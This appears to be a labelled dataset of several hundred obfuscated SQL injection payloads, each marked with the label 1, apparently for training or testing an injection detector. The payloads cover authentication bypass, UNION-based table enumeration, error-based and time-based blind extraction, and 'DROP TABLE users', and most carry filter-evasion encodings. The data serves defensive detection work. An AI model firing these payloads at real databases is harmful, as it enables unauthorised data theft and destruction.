"' && (1=1)1=cOnveRt(InT,@@vERsiON)--", 1
"%u0027%U0020UnIon%u0020seLEcT%U00201,2,3--", 1
"' AND 1=1  OR (1)--", 1
"1' UNION SELECT table_name, null, null FROM information_schema.tables  OR (1)--", 1
"'ANDextractvalue(1,concat(0x5c,version()))--/*%0d%0a*/", 1
"WAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27--%2395cxph91cjpl9g", 1
"'or%0a1=1/*%0a*/--%0d%0a", 1
"%27/**/UNION%20SELECT%20null,%20null,%20null%20--%20", 1
"1/**/A/**/ND/**/1=1--e2osyj2uou", 1
"tes%2574%2527%20OR%20%271%27%3D%271%27%20--%2520", 1
"1))%20%20%20%20%20UNION%20%20%20%20%20SELECT%20%20%20%20%20%31,datab%61s%65%28),3AND", 1
"'a'='a'--%0d%0a", 1
"%27%20UNION%20SELECT%201%2C2%2C3--%235fz4bdps", 1
"1%27%20UNIoN%20SElecT%20TAbLe_naME%2c%20nUll%2C%20nUlL%20from%20INfOrMaTion_SCHEmA.TAbLes%20--", 1
"test'/**/%4fR %271'='1' /%2a", 1
"%27%20AND%201%3D1%20%20#%20more_noise--%20", 1
"test'OR'1'='1'%0d%0a--", 1
"'%09%09%09%09Or%09%09%09%09ExISTS(SeLeCT%09%09%09%091%09%09%09%09from%09%09%09%09USers)%09%09%09%09ANd%09%09%09%09'a'  =	'A'--", 1
"adm%69%6e'/**/OR/**/'1'='1 -- random_noise", 1
"'A%4eD1IN (1)1-%2d%0a#9jetah1v6lyznu6", 1
"%27 AND 1=convert(i%6et,@@%76ersion)-%2d", 1
"'AND", 1
"1=1/*%0a*/--%0d%0a", 1
"test'/**//**//**//**/OR/**//**//**//**/'1'%09=%09'1'/**//**//**//**/--/**//**//**//**/", 1
"; %20   DROP %20   TAB%4cE %20   users;     --", 1
"'/**/aND1IN (1)conveRt(Int,@@VERSiON)--%0a", 1
"test' OR '1'='1' -- --0xb79x", 1
"A%64min%27%20or%20%271%27%3D%271", 1
"%u0027%u0020&&%u0020extractvalue(1,concat(0x5c,version()))%u0020||%u0020(1)--", 1
"1%09%09%09%09AND%09%09%09%09%31  =  1", 1
"test%27OR'1'='1'%20%2d-/*%0d%0a*//*%0d%0a*/", 1
"%27%20OR%20EXIST%2553%28SE%254cECT%201%20F%2552OM%20user%2573%29--", 1
";        SELECT        pg_sleep(5);         # more_noise--", 1
"test%u0027%u0020OR%u0020%u00271%u0027%20=  %u00271%u0027%u0020/*", 1
"%27%20OR%20EXISTS%28SELECT%201%20FROM%20users%29%20--%20random_noise--#rt9fgynz", 1
"AdMiN'/*!*/Or  '1' =	'1", 1
"%27%20OR%201%3d1%20--%20", 1
"' AND extra%63tvalue(%31,con%63at(0x5c,ve%72s%69on()))--", 1
";DROP/*%0a*/TABLEusers;%0a--/*%0d%0a*/", 1
"%27uNIONselecT%250D%250A1%2C2%2C3--", 1
"WAITFORDELAY/*%0a*/'0:0:5'--/*%0d%0a*/", 1
"1)/**//**//**//**//**/UNION/**//**//**//**//**/SELECT/**//**//**//**//**/1,database(),3--", 1
"1'	%09		O/**/R%09		%09a%73cii%28substrin%67(datab%61s%65(),				1,				1))				>				100				--", 1
"%3BSELECT%2%350apg_slee%70%285%2%39%3B%2F%%32A%250%61%2A%2F--%250a", 1
"%27%20UNIOn%20SeLECt%20NULl%2C%20nULl%2C%20NulL%20--%20", 1
"1' AND substring(database(), 1, 1) = 's' --#gr5ll1kjak8q", 1
"1%27%20OR%20ascii(substring(database(),%201,%201))%20%3E%20100%20--#z2bm0u69o", 1
"aDMIN' or '1'='1--itbd9bw", 1
"%u0027%u0020AND%u00201%3D1%u0020--%u0020#sry3xx16q", 1
"t%65ST%27%20%4Fr%20%271%27iN%20(1)%271%27%20--%20", 1
"'/**/OR/**/EXiS%54S%28se%4cEC%54/**/1/**/frOM/**/USErS)--", 1
"1'/**/OR IF(s%75bstring(databa%73e()%2c 1, 1)<=%27a'%2c SLEE%50(5), 0) --", 1
"1'AND/*%0d%0a*/substring(database(),1,/*%0a*/1)	=%20's'OR%0d%0a'b'	=%20'b'----as8uf1fcto", 1
"1%27%20UniOn%20sElECT%20tAbLe_NaMe,%20nULl,%20NulL%20fROM%20informaTiOn_SChema.taBlES%20%20Or%20(1)--", 1
"1)%u0020UNION%u0020SELECT%u00201,database(),3%u0020/*!*/AND%u00201=1----9e0ax9nr", 1
"WaitFor/*!*/DELAY%20%270:0:5%27--", 1
"1'/*!12345*/XOR ascii(substring(database(), 1, 1)) > 100 ----71hoz6bh1", 1
"test%2527%2520O/*!12345*/R%2520%25271%2527%253E%253D%25271%2527%2520%2F%2A", 1
"'/**/OR/**/1 =  1/**/--/**/", 1
"%31%27/*!*/UNION SELECT%20table_name, n%75ll, null %46ROM inform%61tion_%73chema.tables  OR 'b'='b'--#hc%6dxk", 1
"1' OR ascii(substring(database(), 1, 1)) > 100 ----eazd5bdhvi", 1
"admiN'OR'1'='1", 1
"or/*%0a*/(1)/*%0d%0A*/", 1
"' uNioN seLEcT nUlL, nulL, NUlL --", 1
"1'%09%09AND%09%09substring(database(),%09%091,%09%091)%09%09%20=	%09%09's'%09%09--", 1
"tESt'%09or%09'1'%20=%20'1'%09/*", 1
"%27%20Or%20existS(SElECT%201%20fRoM%20Users)--", 1
"%27AND%65x%74r%61ctvalue(1,concat(0x%35c,%76ersion%28)))----srdhqm7%0d%0a", 1
"1'    OR    IF(substring(database(),    1,    1)%20=	'a',    SLEEP(5),    0)    --", 1
"%u0027AND/*%0a*/1=convert(int,@@version)/**/OR/**/(1)--%0d%0a", 1
"1 And 1=1", 1
"test%27 OR %271'%3d'1' --", 1
"1AnD", 1
"1>=1%0d%0A", 1
"1%27%2520OR%2520ascii%28substring%28database%28%29%2C%25201%2C%25201%29%29%2520%3E%2520100%2520--", 1
"1)		UN/**/ION		SELECT		1,database(),3 /*!*/AND 1=1--", 1
"1'/**/UNION%20%20%20%20SELECT%20%20%20%20table_name,%20%20%20%20null,%20%20%20%20null%20%20%20%20FROM%20%20%20%20information_schema.tables%20%20%20%20----vtbzru", 1
"1'/**/or %61sC%49I(su%42STRing(dAT%61B%61SE(), %31, 1)) > 100 --", 1
"'/*!12345*/AND%09%09extractvalue(1,concat(0x5c,version()))--", 1
"1'UNION", 1
"SELECTtable_name,null,nullFROMinformation_schema.tables", 1
"--", 1
"%u0027%U0020oR%u00201LiKE1%U0020 OR 'B'='B'--%u0020", 1
"1%29%29UNION%2F%2A%250d%250a%2A%2FSELECT%250d%250a1%2Cdatabase%28%29%2C3--%250a", 1
"%3B%09%09%09%09SELECT%09%09%09%09pg_sleep%285%29%3B%09%09%09%09--", 1
"1)UNIoN%0d%0aSeLeCT/*%0d%0a*/1,daTaBASe(),3--%0d%0a", 1
"%27%%320OR%20EXISTS(SEL%45CT%%3201%20FROM%20users)-%2d--%6dvp3cev", 1
"'/*!*/UniON seLecT 1,2,3----ub1zgj6tqem2tt2", 1
"%u0027OR/*%0%61*/%u00271%27=%u00271%0d%0a--61cw973s0x91g4", 1
"1)%20UNiO%4e%20selEct%201,d%61T%61BaSe%28),3--", 1
"'OR", 1
"'1'='1/*%0d%0a*/", 1
"' u%6eIon S%65lE%43t %6eulL, NuLL, nULl --", 1
"'/*!12345*/ANd/**/1=cOnvErt(InT,@@vErSion)--", 1
"1))UN/**/ION%0d%0aSELECT1,database(),3--/*%0d%0a*/", 1
"1%u0027%u0020AND%u0020substring(database(),%u00201,%u00201)%u0020=%u0020%u0027s%u0027%u0020--#f9l7784hmkvjl31", 1
"WAITFO/*!12345*/R%25u0020DELAY%25u0020%25u00270%3A0%3A5%25u0027--", 1
"'%09%09%09%09%09OR%09%09%09%09%09'1'=	'1/*%0d%0a*/", 1
"1))%u0020UN/**/ION%u0020SELECT%u00201,database(),3--", 1
"'/**/Or exiStS(seleCt 1 FroM Users)--", 1
"%27oR", 1
"ExISTs(SeLect1%0aFrom", 1
"UseRs)--", 1
"aDmIn' || '1'='1", 1
"waiTfOr DeLaY '0:0:5'--#p596b", 1
"admin'/*!*/%0d%0aOR%0d%0a", 1
"'1'%09=	'1", 1
";/**/DROP%u0020TABLE%u0020users;%u0020--#9i2n48m", 1
"test' || '1'%3d'%31' --%20", 1
";%u0020SELECT%20pg_s%6ce%65p(5);%u0020--", 1
"%u0027/*!12345*/OR%09%u00271%u0027%u0020%u0020=%20%u00271", 1
"1'/**/&&/**%2f(1=1%29su%62string(%64a%74abas%65(),/**/1,/**/1)/**/LIKE/*%2a/'s'/**/%2d-", 1
"'	OR	EXISTS(SELECT	1	FROM	users)	OR	'b'=%09'b'--/*%0a*/", 1
"1%20ANd%201%3D1%20OR%20%27B%27%3D%27b%27", 1
"' AND 1=1  /*!*/AND 1=1-- --cn0b9wm", 1
"1))%20%20%20%20%20UNION%20%20%20%20%20SELECT%20%20%20%20%201,database(),3--", 1
"%27%20UNION%20SELECT%20null,%20null,%20null%20--%20--9wz766", 1
"1/*!*/AND 1=1#vyukziz", 1
"1/**/aND/**/1%3d1", 1
"%57AITFOR/**/DE%4cAY/**/'0:0:5'/**/%2d%2d/**/random_noise--", 1
";dRoptABle%0aUSeRs;--", 1
"", 1
"%27/**/UN/**/ION/**/SELECT/**/1,2,3--", 1
"%2527%2520UniON%2520sELEcT%25201%2C2%2C3--", 1
"1'/**/AND/%2a*/subst%72ing(data%62ase%28%29,/**/1,/**/1)/**/=/**/'%73'/**/ AND%20'a'='%61'--", 1
"test'OR%0a'1'LIKE'1'/*", 1
"admin'/**/OR%20%20%20%20%20'1'> = '1", 1
"'%20%20%20OR%20%20%20'1'%09=	'1", 1
"1%u00%327UNIONSEL%45C%54table_n%61me,null,nullFROM%%30ainformation_schema.%74ables----j%73gj%35", 1
"%27%09UNION%09SELECT%091%2C2%2C3--", 1
"WAITFO/*!*/RDELAY%0d%0a'0:0:5'--", 1
"'or%0d%0a'1'='1%0d%0a", 1
"'%20OR%20'1'	=%09'1", 1
"1' AND s%75bst%72%69ng(d%61tabase(), 1,%201) <= 's' --", 1
"1%u002%37%20%20%20%%320AND%20%2%30%20%%320s%75b%73t%72ing(database(),%20%20%20%201,%20%20%20%201)%20%20%20%20%u0020%u0020%3d%u0020%%320%20%20%20%u%300%327s%u0027%20%20%20%%320--", 1
"' unioN sEleCT 1,2,3 /*!*/AND 1=1--", 1
"; DRop TaBlE USErS;  && (1=1)'a'='a'--#34c1n", 1
"' UNION SEL%45CT 1%2c2,3-%2d", 1
"%u0027/**/Or/**/%u00271%u0027=%u00271/**//*!*/anD/**/1=1", 1
"W%41%49TFOR%2%30%20DELAY%20%2%30'0%3a0:5'----yema14m6pqunz", 1
"'%09%09UNI%4fN%09%0%39SE%4cECT%09%09null%2c%09%09null,%09%09null%09%0%39--%09%0%39--y5rhdr3zwu", 1
"'oR", 1
"eXIstS(SELect1fROM%0d%0aUseRS)--%0a#r1lA1BOw6gf876", 1
"%31'aNdsUBStRing%28datABASe(%29,1,/*%0d%0A%2a/%31)LIKE", 1
"'s'--", 1
"test'O/**/R'1'='1'--%0a%0d%0a", 1
"'A/**/ND%0aextractvalue(1,concat(0x5c,version())) -- random_noise--%0a", 1
"1%29%20UNION%20SELECT%201%2Cdatabase%28%29%2C3--#a3a7p", 1
"1))%20UN%49O%4e%20%53ELECT%201,da%74abase(),3--", 1
"WAI%54FOR/**/DEL%41Y '0:0:%35'--", 1
"1)%u0020UNION%u0020SELECT%u00201,database(),3/*!*/AND1=1--%0a", 1
"test%27%20OR%20%271%27IN%20%281%29%271%27%20AND%0a'a'='a'--%20/*%0d%0a*/", 1
";/**/SELECT/**/pg_sleep(5);/**/----uasxd4cto7me3q8", 1
"1%27%09%09%09oR%09%09%09If%28SUBstRIng%28datAbaSE%28%29%2c%09%09%091%2C%09%09%091%29%09%3d%27a%27%2C%09%09%09slEEp%285%29%2c%09%09%090%29%09%09%09--%0a", 1
"%u0027AND/*%0d%0a*/1=1 OR 'b'='b'--", 1
"%u0027%u002%30AND%u002%30e%78tractv%61lue(1,con%63at(0x5c,vers%69on()))--", 1
"1%25u0027%25u0020uNIOn%25u0020Select%2520tABlE%255fnaMe%2C%25u0020nu%256CL%2C%25u0020%256E%2575LL%25u0020frOm%25u0020IN%2566%256fRMaTion_sCHEma.TabLES%2520--", 1
"%u0027/**%2fAND%u0020e%78tractvalu%65(1,%63oncat(0x5c,%76ers%69on()))--", 1
"1' OR IF(substring(database(), 1, 1)<='a', SLEEP(5), 0)  AND 'a'='a'--", 1
"%u0027%u0020%u0020%u0020%u0020UNION%u0020%u0020%u0020%u0020SELECT%u0020%u0020%u0020%u0020null,%u0020%u0020%u0020%u0020null,%u0020%u0020%u0020%u0020null%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020||%u0020%u0020%u0020%u0020(1)--%u0020%u0020%u0020%u0020", 1
"%27%20UNION%20SELE%2543T%20null%2C%20nul%256c%2C%20null%2520-%252d%20", 1
"1'ANDsubstring(database(),%0a1,1)/*%0d%0a*/='s'--%0a", 1
"'%09%09%09%09O%52%09%09%09%09EXIS%54S(SELE%43T%%309%09%09%091%%309%09%09%%309FROM%09%09%09%0%39users)--", 1
"%27%2F%2A%21%2A%2FoR%20%271%27%3D%271", 1
"'        OR        EXISTS(SELECT        1        FROM        users)--", 1
"'/**/%55NIO%4e SE%4cECT null, null, n%75ll -- #855gkzezfx", 1
"'%20|| 1%3d1 --", 1
"1))UNiOnsELECT/*%0A*/1,daTABAsE(),3--/*%0d%0a*/", 1
"1'%09%09XOR%09%09substring(database(),%09%091,%09%091)%09%09>%09=  %09%09's'%09%09--#wtqc0nebmv", 1
"%u0027	OR	%u00271%u0027%09=%u0020%u00271", 1
"%25u0027%25u0020XOR%25u0020%25u00271%25u0027IN%25u0020%281%29%25u00271", 1
";SELECT", 1
"pg_sleep(5);%0d%0a--/*%0d%0a*/", 1
"'/**/Or/**/'1'='1--WmzuLcE98nP8LBs", 1
"'/**/and 1LIKEcOnvERT(int,@@VErsIoN) OR (1)--", 1
"1'    or    AsCIi(subsTRIng(DataBasE(),    1,    1))    >    100    --", 1
"1%u0027%u0020OR%u0020ascii(substring(database(),%u00201,%u00201))%u0020>%u0020100%u0020 -- random_noise--", 1
"1)UNIONSELECT1,database(),3%20AND%20%27a%27%3D%27a%27--", 1
"", 1
"t%65st' OR '1'='1' /*--%65%7a9%73dvds3uz", 1
"'/**/OR/**/1=1/**/--/**/--lqganv3m", 1
"test%u0027%u0020OR%u0020%u00271%u0027LIKE%u00271%u0027%u0020--%u0020", 1
"WAitfoR dElAY '0:0:5'--", 1
"'oR/*%0a*/exiSTs(seLecT", 1
"1%0afROMUseRs)--", 1
"tEST%27%20oR%20%271%27%3D%271%27%20/*", 1
"%3B%20SEL/*!*/ECT%20pg_sleep%285%29%3B%20----7t7jem4zov06bto", 1
"1%u0027%u0020oR%u0020asCIi(sUBstring(daTaBasE(),%u00201,%u00201))%u0020>%u0020100%u0020 OR 'b'='b'--#17u2a5axgtb", 1
"test'/**/OR/**/'1'%09=%20'1'/**//*", 1
"test'%20||/*!*/(1=1)'1'>%3d'1%27 --", 1
"tEst%27%20Or%20%271%27%3D%271%27%20/*/*!*/OR 'b'='b'", 1
"test'/**/OR/**/'1'='1'/**//**/OR/**/'b'='b'--/**/#pilgmo7", 1
"1' OR ascii(substring(database(), 1, 1)) > 100  OR 'b'='b'----v2yrrgx49szw", 1
"'  OR  1%20IN (1)	1  --  #gwh5g3hc4", 1
"1'ANDsubstring(database(),1,1)%0d%0a='s'", 1
"--", 1
"1'/**//**//**//**//**/OR/**//**//**//**//**/IF(substring(database(),/**//**//**//**//**/1,/**//**//**//**//**/1)/**/=%20'a',/**//**//**//**//**/SLEEP(5),/**//**//**//**//**/0)/**//**//**//**//**/--", 1
"%27AND1%3E%3D1 AND 'a'='a'--", 1
"", 1
"1'ANDsubstring(database(),1,1)='s'--", 1
"", 1
"1)%u0020uNiON%U0020seleCT%U00201,DATAbASe(),3--", 1
"test'||(1=1)'1'=%09'1'", 1
"--%0a#96oag5wmk", 1
"1'/**/xoR/**/Ascii(Substring(DatABasE(),/**/1,/**/1))/**/>/**/100/**/--", 1
"'/**/UniON/**/selECT/**/1,2,3--", 1
"'/*!*/AND 1=1 -- --8ao99j", 1
"' AnD Ex%74RACt%76ALUE(1,co%6E%63At(0x5c,vErSIon()))-%2d", 1
"'%09%09%09uNIoN%09%09%09seLECt%09%09%091,2,3--", 1
"1%2F%2A%21%2A%2FA%254eD%20%2531%3D1", 1
"'/**/OR/**/1%09=%201/*%2a/%2d-/%2a*/", 1
"' UnIOn selEcT 1,2,3--", 1
"'%09%09UNION%09%09SELECT%09%091,2,3--#qh18aybr", 1
"'AND%0d%0aextractvalue(1,concat(0x5c,version())) OR 'b'='b'--%0d%0a", 1
"1%27ANDsubstring(database(),1,%0d%0a1)%3D/*%0d%0a*/%27s%27--random_noise--", 1
"1%2527%2520Or%2520ASciI%28SUbsTrIng%28DATAbASe%28%29%2C%25201%2C%25201%29%29%2520%253E%2520100%2520--", 1
"%27%09%09%09%09AND%09%09%09%091%20%3D%201%09%09%09%09%20OR%20%27b%27%3D%27b%27--%09%09%09%09", 1
"'/*!12345*/aNd/**/eXtrACtVAluE(1,cONCAt(0x5c,VerSiON()))--", 1
"1'ANDsubstring(database(),", 1
"1,/*%0a*/1)='s'--", 1
"%3B%2F%2A%2A%2FDROP%2F%2A%2A%2FTABLE%2F%2A%2A%2Fusers%3B%2F%2A%2A%2F----tpyeeb09uuy", 1
"admin'%09%09%09%09OR%09%09%09%09'1'	LIKE'1", 1
"", 1
"%u0027%u0020||%u0020(1IN (1)1)%u00271%u0027=%u00271", 1
"%253bDRO%2550%250d%250aTABLE%0Auser%2573%3B--%0A", 1
"' UNION S%45LEC%54%201,2,3--", 1
"' && extractvalue(1,concat(0x5c,version())) OR 'b'='b'--", 1
"1)) u%4EIon sE%4cEct 1%2CdAtabAs%65(),3 -- random_noise--", 1
"TeSt' OR '1'Like'1' /*", 1
"admin' OR '1'='1#5zoc3m", 1
"; dRoP tAbLe useRS; ----zzqnhejlpl1h133", 1
"' UNION S%45%4cECT n%75ll, null, null%20 -- r%61ndom_noise%2d-", 1
"'  AND  1	=%091  --", 1
"1%27%20AND%20substring(database(),%201,%201)%20%3D%20%27s%27%20%20#%20more_noise--#oerf0itmcf", 1
"1%27/*!*/OR%20IF(substring(database(),%201,%201)%3D%27a%27,%20SLEEP(5),%200)%20--", 1
"'%20%20%20%20%20XOR%20%20%20%20%201%20=%20convert(int,@@version) OR (1)--", 1
"1/*!*/AND        1LiKE1", 1
"test'/**/OR/**/'1'='1'/**/--/**/--p23veo4o", 1
"%27%20AND%201%3Dconvert(int,@@version)--#rbiiyd4xrpeuh88", 1
"%2531%29%20unio%254E%20sELeCt%201%2CD%2561TabasE%28%29%2C%2533--", 1
"ad%6din%27OR%0d%0a%27%31%27%3D%271", 1
"1%29%29%20UNION%20SELECT%201%2Cdatabase%28%29%2C3--%0arandom_noise--%0a", 1
"%27%20AND%20extractvalue(1,concat(0x5c,version()))----z6496d5lqwc", 1
"1%27/**/%4fR%2%30IF(sub%73tring(database(%29,%%3201,%2%301)%3D%27a%27,%20SLE%45P%285),%200)%20--", 1
"1))UNiON", 1
"SeleCT%0a1,dATabasE(),3--", 1
"1%u0027/**/And/**/suBstRiNG(database(),/**/1,/**/1)/**/=/**/%u0027s%u0027/**/--", 1
"%31' AND %73ubstring(database(%29, 1,%201) LIKE 's'%20--", 1
"1/**/AND/**/1=1--mlt3ikw4x0x91c", 1
"1))/*!*/UNION%u0020SELECT%u00201,database(),3--", 1
"1%27%20UNION%20SELECT%20table_name%2C%20null%2C%20null%20FROM%20information_schema.tables%20/*!*/AND%0d%0a1=1--", 1
"' a%4Ed 1=1 %2D-", 1
"1) UNion select 1,DAtAbaSE(),3--", 1
"'/**//**//**//**//**//**//**//**/AND/**//**//**//**//**//**//**//**/extractvalue(1,concat(0x5c,version()))--", 1
"'/**/|| (1=1)1=1 -- --so4759uu0hdevj", 1
"'AND%0d%0a1=1%0a AND 'a'='a'--#niwi3775bp", 1
"'OR%0a1=1--%0d%0a", 1
"'UNION/*%0d%0a*/SELECTnull,null,null--#7g5f4089k", 1
"'	AND	extractvalue(1,concat(0x5c,version()))--", 1
"test'/**/O/*!12345*/R/**/'1'='1'/**/--/**/", 1
"test'					OR					'1' =	'1'					/*", 1
"%u0027%u0020UNION%u0020SELECT%u0020null,%u0020null,%u0020null%u0020--%u0020#ramv9cbgp4kp6p", 1
"%3B%2F%2A%2A%2FdRop%2F%2A%2A%2FtaBLE%2F%2A%2A%2FuSERs%3B%2F%2A%2A%2F%20%2F%2A%21%2A%2FAND%201%3D1--", 1
"1%27%09%09%09%09%09%7C%7C%09%09%09%09%09%281%20%3D%25091%29IF%28substring%28database%28%29%2C%09%09%09%09%091%2C%09%09%09%09%091%29%20%3D%2509%27a%27%2C%09%09%09%09%09SLEEP%285%29%2C%09%09%09%09%090%29%09%09%09%09%09--%23pfxp0vs2y1vup", 1
"'	%09XOR		EXIST%53%28SELECT		1%09	FROM		us%65rs)--", 1
"tesT' Or '1'='1' -- --S79rxTYlJWh53", 1
"WAITFO/**/R%20DELAY%20%270%3A0%3A5%27%20OR%20%27b%27%3D%27b%27--", 1
"1) UNION SELECT 1,database(),3--#coeywm", 1
"%u0027/*!*%2fAND%u00201>=conve%72t(int,@@version%29-%2d", 1
"%3B%20DROP%20TABLE%20users%3B%20%20OR%20%27b%27%3D%27b%27--", 1
"test%u0027%u0020OR%u0020%u00271%u0027	=%09%u00271%u0027%u0020--%u0020", 1
"test%27%20OR%20%271%27%3D%271%27%20%20--%20random_noise--%20", 1
"' unIon seLecT%20%31,%32,3--#y7f2xaihr0ywe", 1
"%27AND1%3D1%2F%2A%250d%250a%2A%2F--%0A%250a--hg4ctng", 1
"%u0027%u0020UNION%u0020SELECT%u00201,2,3--#2tx8ts5k", 1
"'				OR				'1'LIKE'1 OR 'b'='b'--yi6qq3op90g", 1
"test%27%2%30O%52%20%271%27%3D%271%27%%320%2d-%20", 1
"' and extRactvALue(1,cONCat(0X5C,veRSIoN()))--#dsyzcwcxm2krq", 1
";%20%20DROP%20%20TABLE%20%20users;%20%20--", 1
"'/*!12345*/xor EXtraCtvALuE(1,cOnCat(0x5C,VERSION())) /*!*/And 1=1--", 1
"'/%2a!12345*/AN%44 1=convert(int,%40@ver%73i%6fn)--", 1
"1%27%09UNION%09SELECT%09table_name%2C%09null%2C%09null%09FROM%09information_schema.tables%09--", 1
"'/*%2a/OR EXISTS(SEL%45CT 1 FROM%20user%73) OR (1)%2d-", 1
"'/**/AND/**/extractvalue(1,concat(0x5c,version()))--#xyvoxj6mn91", 1
"%27/**/UNION/**/SE%4cECT/**/null%2c/**/nul%6c,/**/null/**%2f--%2f**%2f", 1
";/**/DROP/**/TABLE/**/users;/**//**//*!*/AND/**/1=1--#5jbsl", 1
"%2527%2F%2A%21%2A%2FAND%25201%253D1%2520--%2520", 1
"aDMIn%u0027/**/OR/**/%u00271%u0027>=%u00271", 1
"1)) UNioN seleCt 1,dATAbaSE(),3--#eh6gx", 1
"%u0027%u0020AND%u00201%20%20LIKE%20convert(int,@@version)--", 1
"%27%20O/**/R%%3201%3D1%20%20%4fR%20%281%29--%2%30", 1
"WAITFOR%20DELAY%20%270:0:5%27%20--%20random_noise--", 1
"%27%2F%2A%21%2A%2FOR%20EXISTS%28SELECT%201%20FROM%20users%29 OR (1)--", 1
"%27%20OR%201%3D1%20--%20#hdutlz1baw", 1
"%u0027%u0020O%52%u%30%3020EXISTS(S%45LECT%u00201%u%30020FROM%u0%3020users)--", 1
"%u0027%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020AND%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u00201%u0020%u0020>=%u0020%u0020convert(int,@@version)--", 1
"'AND1=1--", 1
"", 1
"'%09%09%09ANd%09%09%09EXtrActvALuE(1,COncat(0X5c,vERSION()))%09%09%09/*!*/anD%09%09%091%09=1--", 1
"", 1
"1%2F%2A%2A%2FAND%2F%2A%2A%2F1%3D1/*!12345*/OR 'b'='b'", 1
"1'/**/AND/**/substring(database(),/**/1,/**/1)/**/IN (1)/**/'s'/**/ -- random_noise--", 1
"'%09%09%09%09%09oR%09%09%09%09%091	=%091%09%09%09%09%09--%09%09%09%09%09", 1
"1)	UNION	SELECT	1,database(),3----36zablctxza", 1
"1%25U0027%25u0020OR%25U0020if%28SUbStRInG%28daTaBASe%28%29%2C%25u00201%2c%25u00201%29%3D%25u0027a%25U0027%2C%25U0020sleEP%285%29%2c%25u00200%29%25U0020--", 1
"1%2%37%20A%4eD%%320substring(database(),%%3201,%20%31)%20%3D%%320%27s%27%20--", 1
"1)/**/UNION/**/SELECT/**/1,database(),3--#30yekh5hhp", 1
"1'ANDsubstring(database(),%0a1,1)='s'", 1
"--", 1
"1' unIOn sELECT tablE_name, nULL, NuLl fRom infORmatIon_SCHeMa.tABlES --", 1
"1%27%u0020OR%u0020I%46(substri%6eg(data%62ase(),%u00201,%201)=%u0027a%u0027,%u0020SLEEP(5),%u00200)%20--", 1
"%27%2520%2520%2520%2520%2520OR%2520%2520%2520%2520%2520%271%27%2520IN%20%281%29%20%271%20OR%20%281%29", 1
"teSt'/*!*/Or '1'='1' --", 1
"1))%20%20UNION%20%20SELECT%20%201,database(),3--#skxizdrl7jjf1k", 1
"%27OREXISTS(SELECT%0d%0a1/*%0d%0a*/FROMusers)--", 1
"%%327%20O%52%20EXISTS(SELECT%201%20FROM%2%30%75se%72s)--", 1
"1%27%20XOR%20I%46(substring(da%74abase(),%201,%201)%3D%27a%27,%20%53LEEP(5),%200)%20-%2d", 1
"1/**/ANd/**/1=1", 1
"test'OR'1'='1'%0a--", 1
";SELE%43T/*%0a*/pg_sle%65p(5)%3b%0d%0a--#caem%6fbtj%0a", 1
"' AND ext%72actval%75e(1,%63on%63%61t(0x5c,version()))--", 1
"1'/*!12345*/AND SUbStRIng(dATAbaSe(), 1, 1) = 's'  /*!*/AND 1=1--", 1
"1%27ORascii%28substring%28database%28%29%2C1%2C%0A1%29%29%3E%2F%2A%250d%250a%2A%2F100--", 1
"1%u0027%u0020||%u0020(1=1)IF(substring(database(),%u00201,%u00201)=%u0027a%u0027,%u0020SLEEP(5),%u00200)%u0020--", 1
"a%64mi%6e'/*!*/OR%09%09%09%09'1'  =%09'1", 1
"%27%20UnIoN%20SelecT%201,2,3----9nnqmcdknmvc", 1
"1%U0027/**/and/**/SUbstriNg(DAtABaSE(),/**/1,/**/1)/**/%3D/**/%U0027S%U0027/**/--", 1
"' %41ND 1=conver%74(int,@@ver%73%69on)--", 1
"WAITFO/*!12345*/RDELAY'0:0:5'--%0a#n1mrdi2k3ty5qyd", 1
"waITFOR/**/dELAY '0:0:5'--", 1
"1%27%20UNION%20SELECT%20table_name%2C%20null%2C%20null%20FROM%20information_schema.tables%20----d9zguwrbp", 1
"1%27%20XO/*!*/R%20substring(database(),%201,%201)%20%3D%20%27s%27%20--", 1
"WAITFORDELA%59%0d%0a'0:%30:5'-%2d%0a", 1
"admin%2527%2520OR%2520%25271%25%32%37%253D%2%3527%31", 1
"%31'	OR	ascii(substring%28dat%61%62a%73e(),	1,	1))	>	100	--", 1
"admin'/**/OR/**/'1'='1--fr5ryscy5cmi7v", 1
"test%u0027OR/*%0a*/%u00271%u0027	>=%u00271%u0027%0d%0a--%0d%0a", 1
"%27%20or%201%3d1%20--%20--UJ67evZ732", 1
"'%41nd1=cOnvErT(%69%6ET,@@VER%73Ion)--", 1
"", 1
"'UnIoN/*%0a*/selECT/*%0d%0A*/1,2,3--#1JeUmV", 1
"", 1
"%27/*!12345*/OR%20%271%27%3D%271", 1
"'Or1=1%0a--/*%0a*/%0d%0a", 1
"1' AND substring(database(), 1, 1) = 's' ----sgu03lno0h7a", 1
"%25u0027%25u0020UNION%25u0020SELECT%25u00201%2C2%2C3----ugzgj", 1
"test'    OR    '1'%20LIKE%09'1'    --    --2mdvhvv5il", 1
"1%u0020AND%u00201=1%u0020#%u0020more_noise", 1
"1%27/**/AND substr%69ng(database%28), 1, 1) = %27s'%20--", 1
"%27 OR '1'=%271 # moRe_NoIse", 1
"1/**/AND 1<=1", 1
"1%29%2509%2509%2509%2509%2509UNION%2509%2509%2509%2509%2509SELECT%2509%2509%2509%2509%25091%2Cdatabase%28%29%2C3--%235p4279v8eucczb", 1
"admIN' Or '1'='1", 1
"1'      XOR      ascii(substring(database(),      1,      1))      >      100      --", 1
"%31%29%20UNION%20%53ELECT%201,dat%61base(),3--", 1
"test%27%20OR%20%271%27%3D%271%27%20--%20--nqa3c26u8", 1
"%25u0027%25u0020UNION%25u0020SELECT%25u0020null%2C%25u0020null%2C%25u0020null%25u0020--%25u0020", 1
"1%27%20OR%20IF(substring%28databa%73e(),%201,%201)%3d%27a%27,%20S%4cEEP(5),%200%29%20--", 1
"1%27%20%20%20%20%20AND%20%20%20%20%20substring(database(),%20%20%20%20%201,%20%20%20%20%201)%20%20%20%20%20%20%20%3D%20%20%20%20%20%20%27s%27%20%20%20%20%20--", 1
"1%29%20UN/*!*/ION%20SELECT%201%2Cdatabase%28%29%2C3--", 1
"1) UNION SELECT 1,database(),3----8nyf9ynsonqu57", 1
"WAitfOR%20Delay%20%270:0:5%27/**/AND/**/'a'='a'--", 1
"1'/*!12345*/OR IF(substring(database(), 1, 1)LIKE'a', SLEEP(5), 0)  -- random_noise--#iy243", 1
"%27%20AND%201%3D1%20%20OR%20(1)--%20", 1
"test' OR '1'=%271' %2f*", 1
";%20DROP%20TABLE%20users;%20 OR (1)--", 1
